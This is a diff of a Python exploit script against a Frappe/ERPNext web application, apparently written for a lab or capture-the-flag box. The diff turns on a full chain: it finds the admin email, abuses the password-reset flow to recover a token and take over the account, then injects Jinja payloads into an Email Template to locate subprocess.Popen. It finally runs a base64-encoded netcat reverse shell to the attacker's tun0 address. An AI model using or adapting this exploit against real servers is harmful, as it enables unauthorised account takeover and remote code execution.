@@ -46,7 +46,6 @@ def send_reset_password(ip, admin_email):
 		"user": admin_email
 	}
 	r = requests.post(target, data=data)
-	print(r.text)
 	if "Password reset instructions" not in r.text:
 		print("Password reset unsuccessful")
 		exit(0)
@@ -172,14 +171,11 @@ def update_template(ip, session, admin_email, template_name, template):
 	r = session.get(target)
 	template_info = json.loads(r.text)
 
-	with open("template_info.json", "w") as f:
-		f.write(json.dumps(template_info))
+	# with open("template_info.json", "w") as f:
+	# 	f.write(json.dumps(template_info))
 
-	# curtime = (datetime.utcnow() - timedelta(hours = 4)).strftime("%Y-%m-%d %H:%M:%S.%f")
 	creation_time = template_info["docs"][0]["creation"]
 	modified_time = template_info["docs"][0]["modified"]
-	print("Got creation time :", creation_time)
-	print("Mod time: ", modified_time)
 
 	doc = {
 		"modified":modified_time,
@@ -203,6 +199,47 @@ def update_template(ip, session, admin_email, template_name, template):
 
 	r = session.post(target, data=data)
 
+def get_output(ip, session, admin_email, template_name, template):
+	print("")
+	print("Executing template " + template)
+
+	# Update Template
+	update_template(ip, session, admin_email, template_name, template)
+
+	# Start by getting template information
+	target = f"http://{ip}:8000/api/method/frappe.desk.form.load.getdoc?doctype=Email+Template&name={template_name}"
+
+	r = session.get(target)
+	template_info = json.loads(r.text)
+
+	creation_time = template_info["docs"][0]["creation"]
+	modified_time = template_info["docs"][0]["modified"]
+
+	doc = {
+		"modified":modified_time,
+		"owner":admin_email,
+		"modified_by":admin_email,
+		"docstatus":0,
+		"idx":0,
+		"response":f"<div>{template}</div>",
+		"doctype":"Email Template",
+		"creation":creation_time,
+		"name":template_name,
+		"subject":"Pwned!"
+	}
+
+	target = f"http://{ip}:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
+
+	data = {
+		"template_name": template_name,
+		"doc": json.dumps(doc),
+		"action": "Save"
+	}
+
+	r = session.post(target, data=data)
+	
+	return r.text
+
 def generate_shellcode(LHOST, LPORT):
 	command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
 	encoded = base64.b64encode(command.encode())
@@ -210,7 +247,7 @@ def generate_shellcode(LHOST, LPORT):
 
 	return encoded
 
-def execute_command(ip, session, admin_email, command):
+def execute_command(ip, session, admin_email, template_name, command):
 
 	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
 	LPORT = 9001
@@ -222,17 +259,31 @@ def execute_command(ip, session, admin_email, command):
 	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
 	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
 	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
-	"{% set subprocess = subclasses[391] %}"
-	"{% set shellcode = \"echo " + shellcode + " = | base64 -d  | sh\" %}"
-	"{{subclasses}}"
-	)
+	# "{% set subprocess = subclasses[391] %}"
+	# "{% set shellcode = \"echo " + shellcode + " = | base64 -d  | sh\" %}"
+	"{{subclasses}}")
 
-	template_name = create_email_template(ip, session, admin_email, template)
-	print(template_name)
+	output = get_output(ip, session, admin_email, template_name, template)
+	resp = json.loads(output)["message"]["message"]
+	resp = resp[5:-6] # Remove <div></div> tag
 
-	print(template)
-	# template_name = create_email_template(ip, session, admin_email, template)
+	# Match away <class XXX > tags
+	subclasses = re.findall('<class \'(.*?)\'>,', output)
+	popen_index = subclasses.index('subprocess.Popen')
+	print("Subclass index: ", popen_index)
+	
+	template = ("{% set string = \"test\" %}"
+	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
+	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
+	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
+	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
+	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
+	f"{{% set subprocess = subclasses[{popen_index}] %}}"
+	f"{{% set shellcode = \"echo {shellcode} = | base64 -d  | sh\" %}}"
+	"{{subprocess(shellcode, shell=True)}}")
 
+	output = get_output(ip, session, admin_email, template_name, template)
+	print(output)
 
 def main():
 	if len(sys.argv) != 2:
@@ -248,26 +299,24 @@ def main():
 	admin_email = get_admin_user_email(ip)
 	print(f"Admin email {admin_email} found!")
 
-	# print("Sending password reset......")
-	# send_reset_password(ip, admin_email)
+	print("Sending password reset......")
+	send_reset_password(ip, admin_email)
 
-	# print("Searching for password reset token")
-	# token = get_password_reset_token(ip, admin_email)
-	# print(f"Sucessfully got reset token {token}")
+	print("Searching for password reset token")
+	token = get_password_reset_token(ip, admin_email)
+	print(f"Sucessfully got reset token {token}")
 
-	# print("Restting password")
-	# reset_password(ip, admin_email, token, new_password)
-	# print("Password reset succesfully!")
+	print("Restting password")
+	reset_password(ip, admin_email, token, new_password)
+	print("Password reset succesfully!")
 
 	print("Logging in now")
 	session = login(ip, admin_email, new_password)
 
-	# execute_command(ip, session, admin_email, "whoami")
 	template_name = create_email_template(ip, session, admin_email, "baseline")
 	print(f"Created new template named: {template_name}")
-	# template_name = "c048e86f"
 
-	update_template(ip, session, admin_email, template_name, "baseline3")
+	execute_command(ip, session, admin_email, template_name, "whoami")
 
 if __name__ == '__main__':
 	main()
